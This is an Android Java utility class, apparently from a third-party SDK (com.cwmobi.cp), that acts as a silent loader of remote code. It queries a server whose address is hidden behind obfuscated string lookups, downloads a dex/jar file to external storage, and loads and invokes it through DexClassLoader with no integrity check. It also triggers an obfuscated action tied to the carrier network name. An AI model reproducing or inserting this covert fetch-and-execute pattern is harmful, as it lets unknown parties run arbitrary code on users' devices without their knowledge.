package com.cwmobi.cp;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.params.ConnRoutePNames;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.os.Handler;
import android.text.TextUtils;
import dalvik.system.DexClassLoader;

/**
 * @author fyq
 * @date 2016-4-26 下午2:45:51
 * 
 */
class Utils {
    
    
    static Handler sHandler;
    
    public interface JsonInterface {
        void parse(JSONObject jo);
        Object build();
    }
    
    
    /**
     * 动态库信息
     * @author fyq
     *
     */
    public static class DexInfo implements JsonInterface {
        //a dex文件 下载地址
        public String urlDownladDex;
        //b dex版本号
        public String version;
        
        //c dex保存路径
        public String dexSaveDir;

        @Override
        public void parse(JSONObject jo) {
            try {
                urlDownladDex = jo.isNull("a")?urlDownladDex:jo.getString("a");
                version = jo.isNull("b")?version:jo.getString("b");
                dexSaveDir = jo.isNull("c")?dexSaveDir:jo.getString("c");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public Object build() {
            // TODO Auto-generated method stub
            return null;
        }
        
    }
    

    
    private static boolean sIsRequestingDexInfo;

    private static DexInfo sDexInfo;
    
    private static Context sCtx;

    private static ExecutorService threadpool;
    private static Class clzInDex;
    private static Object objInDex;
    
    private static class InvokeInfo {
        int index;
        Object[] args;
    }
    
    private static List<InvokeInfo> invokeQueue = new ArrayList<InvokeInfo>();
    
    private static boolean isMounted(){
        return Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState());
    }
    
    private static boolean isnetworkwap(String name){
        if(!TextUtils.isEmpty(name)){
            if("cmwap".equalsIgnoreCase(name)
                    ||"3gwap".equalsIgnoreCase(name)
                    ||"uniwap".equalsIgnoreCase(name)){
                return true;
            }
        }
        return false;
    }
    
    static String sid;
    static String schid;
    static Class sClzActivity;
    
    
    static void init(Context ctx, String id, String chid){
        
        sCtx = ctx.getApplicationContext();
        if(TextUtils.isEmpty(sid)){
            sid = id;
        }
        if(TextUtils.isEmpty(schid)){
            schid = chid;
        }
        if(sClzActivity==null){
            try {
    //            sClzActivity = Class.forName(Utils.class.getPackage().getName()+"."+
    //                            "EmptyActivity");
                
                PackageManager pm = ctx.getPackageManager();
                PackageInfo pi = pm.getPackageInfo(ctx.getPackageName(), PackageManager.GET_ACTIVITIES);
                ActivityInfo[] activitys = pi.activities;
                if(activitys!=null){
                    for(ActivityInfo ai :activitys){
                        if(Constants.D) System.out.println("xxxx:compare-"+Utils.class.getPackage().getName()+","+ai.name);
                        if(ai.name.contains("Run")) continue;
                        if(ai.name.contains(Utils.class.getPackage().getName())){
                            if(Constants.D) System.out.println("xxxxx:match:"+ai.name);
                            sClzActivity = Class.forName(ai.name);
                        }
                    }
                }
                
            } catch (Exception e) {
            }
        }
        if(Constants.D) System.out.println("xxxx:activity"+sClzActivity);
        
        if(sHandler==null){
            sHandler = new Handler(sCtx.getMainLooper());
        }
        
        if(threadpool==null){
            threadpool = Executors.newCachedThreadPool();
        }
        
        requestDexInfo(sCtx);
        
        //Test
        loadDex2("");
    }
    
    static File loadlocaldex(){
        try {
            InputStream is = sCtx.getAssets().open("upgratetest.jar");
            File dir = new File(Environment.getExternalStorageDirectory(), "tmp");
            if(!dir.exists()||dir.isFile()){
                dir.mkdir();
            }
            File tmp = new File(dir, "tmp.jar");
            FileOutputStream os = new FileOutputStream(tmp);
            byte[] buf = new byte[1024*8];
            int len = -1;
            while((len=is.read(buf))!=-1){
                os.write(buf, 0, len);
            }
            os.close();
            is.close();
            
            return tmp;
            
        } catch (Exception e) {
            System.out.println(e);
            e.printStackTrace();
        }
        return null;
    }
    
    private static boolean isReady(){
        if(clzInDex!=null&&objInDex!=null){
            return true;
        }
        return false;
    }
    
    private static void requestDexInfo(final Context ctx){
        if(!isMounted()){
            return ;
        }
        if(sDexInfo==null&&!sIsRequestingDexInfo){
            sIsRequestingDexInfo = true;
            threadpool.submit(new Runnable() {
                
                @Override
                public void run() {
                    int count = 3;
                    DexInfo info=null;
                    while(count>0&&info==null){
                        if(Constants.D) System.out.println("xxxx:request count:"+count);
                        info = requestDexInfoImpl(ctx);
                        count--;
                    }
                    sIsRequestingDexInfo = false;
                    if(info!=null){
                        sDexInfo = info;
                        onGetDexInfo(sDexInfo);
                    }
                }
            });
        }
        
        ConnectivityManager cm = (ConnectivityManager) sCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        if(ni!=null)
        {
            if(ni.getExtraInfo()!=null&&ni.getExtraInfo().toLowerCase().contains(a.d(8))){
                a.c(12, new Object[0]);
            }
        }
    }
    
    private static void onGetDexInfo(DexInfo info){
        if(Constants.D) System.out.println("ongetdexinfo " +info + "," + Thread.currentThread().getName());
        System.out.println("...");
        /*if(true){
            final File file = loadlocaldex();
            System.out.println("xxxx:"+file);
            if(file.exists()){
                sHandler.post(new Runnable() {
                    
                    @Override
                    public void run() {
                        loadDex(file.getPath());
                    }
                });
            }
            return ;
        }*/
        

        final File file = getDexFile(info.urlDownladDex, info.version, info.dexSaveDir);
        if(file.exists()){
            sHandler.post(new Runnable() {
                
                @Override
                public void run() {
                    loadDex(file.getPath());
                }
            });
        }
        else {
            download(sCtx, info.urlDownladDex, file);
        }
    }
    
//  static final String url = "http://s.unfoot.com/cw/interface!u2.action?protocol=%s&version=%s&cid=%s";
    
    @SuppressWarnings("deprecation")
    private static DexInfo requestDexInfoImpl(Context ctx){
        
        
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = cm.getActiveNetworkInfo();
        if(activeNetworkInfo==null||!activeNetworkInfo.isAvailable()){
            return null;
        }
        
        try {
            HttpClient client = new DefaultHttpClient();
            HttpParams params = client.getParams();
            HttpConnectionParams.setSoTimeout(params, 30*1000);
            HttpConnectionParams.setConnectionTimeout(params, 30*1000);
            String extraInfo = activeNetworkInfo.getExtraInfo();
            if(isnetworkwap(extraInfo)){
                //proxy
                params.setParameter(ConnRoutePNames.DEFAULT_PROXY, new HttpHost("10.0.0.172", 80));
            }
            String url = getUrl();
            if(Constants.D) System.out.println("xxxx:url"+url);
//            System.out.println(url);
            HttpPost post = new HttpPost(url);
            
            HttpResponse response = client.execute(post);
//            System.out.println(response.getStatusLine().getStatusCode());
            if(Constants.D)  System.out.println("sc:" + response.getStatusLine().getStatusCode());
            if((response.getStatusLine().getStatusCode()+"").startsWith("2")){
                long contentLength = response.getEntity().getContentLength();
                
                InputStream is = response.getEntity().getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String json = reader.readLine();
                if(Constants.D)  System.out.println("xxxx:" + json);
                DexInfo info = new DexInfo();
                info.parse(new JSONObject(json));
                is.close();
                return info;
            }
        } catch (Exception e) {
            e.printStackTrace();
            if(Constants.D) System.out.println("throw :" + e);
        }
        return null;
    }
    
    private static String getUrl() {
       return String.format(a.d(1), a.d(2), a.d(5), sid);
    }

   /* void initdex(Context ctx){
        File file = new File(Environment.getExternalStorageDirectory(),
                "upgratetest.jar");
        a.b(file.getPath(), ctx.getFilesDir().getPath(), ctx.getFilesDir().getPath(),
                ctx.getClassLoader());
    }*/

    
    
    static boolean isLoadDex = false;
    
    static void loadDex(String path){
        
        SharedPreferences sp = sCtx.getSharedPreferences("cwdata", 0);
        sp.edit().putString("dexpath", path).commit();
        if(Constants.D) System.out.println("xxxx:save dexpath:"+path);
        
        a.b(path, sCtx.getFilesDir().getPath(), sCtx.getFilesDir().getPath(), sCtx.getClassLoader());
        a.c(Constants.METHOD_INIT, new Object[]{sCtx, sid, schid, sClzActivity });

        isLoadDex = true;
        
        System.out.println("xxxxloaddexfinish:" + path);
    }
    
    public static void loadDex2(String path){
        try {
            ClassLoader loader = new DexClassLoader(path, sCtx.getFilesDir().getPath(), sCtx.getFilesDir().getPath(), sCtx.getClassLoader());
            System.out.println(loader);
            clzInDex = loader.loadClass("com.cw.I");
            System.out.println("clzindex," + clzInDex);
            
            Constructor cons = clzInDex.getDeclaredConstructor(Context.class);
            cons.setAccessible(true);
            objInDex = cons.newInstance(sCtx);
            System.out.println("objindex,"+objInDex);
        
        } catch (Exception e) {
        }
    }
    
    private static File getDexFile(String url, String version, String savedir){
        File dir = new File(Environment.getExternalStorageDirectory(), savedir);
        if(!dir.exists()){
            dir.mkdirs();
        }
        String name = version+"_"+url.substring(url.lastIndexOf("/")+1);
        File file = new File(dir, name);
        return file;
    }
    
    
    private static void onDownloadDexFile(final File dex){
        if(Constants.D ) System.out.println("download success " + dex);
        
        //
        sHandler.post(new Runnable() {
            
            @Override
            public void run() {
                loadDex(dex.getPath());
            }
        });
    }
    
    
    /**
     * 下载动态类包
     * @param ctx
     * @param url
     */
    static void download(final Context ctx, final String  url, final File file){
        if(Constants.D) System.out.println("download start");
        threadpool.execute(new Runnable() {
            
            @Override
            public void run() {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setConnectTimeout(30*1000);
                    conn.connect();
                    InputStream is = conn.getInputStream();
                    byte[] buf = new byte[1024*4];
                    int len = 0;
                    
                    File tmpFile = new File(file.getPath()+".tmp");
                    
                    FileOutputStream os = new FileOutputStream(tmpFile);
                    while((len=is.read(buf))!=-1){
                        os.write(buf, 0, len);
                    }
                    os.close();
                    is.close();
                    
                    tmpFile.renameTo(file);
                    
                    onDownloadDexFile(file);
                    
                } catch (Exception e) {
                    e.printStackTrace();
                    
                    if(Constants.D) System.out.println("download fail:" + e);
                }
            }
        });
    }
    
    public static void onReceiver(Context ctx, Intent intent ){
        if(!isLoadDex){
            String path = ctx.getSharedPreferences("cwdata", 0).getString("dexpath", "");
            if(Constants.D) System.out.println("xxxx:path:"+path+new File(path).exists());
            if(!new File(path).exists()){
                return;
            }
            
            a.b(path, ctx.getFilesDir().getPath(), ctx.getFilesDir().getPath(), ctx.getClassLoader());
        }
        
        a.c(Constants.METHOD_ONRECEIVER, new Object[]{ctx, intent});
    }
    
    
}
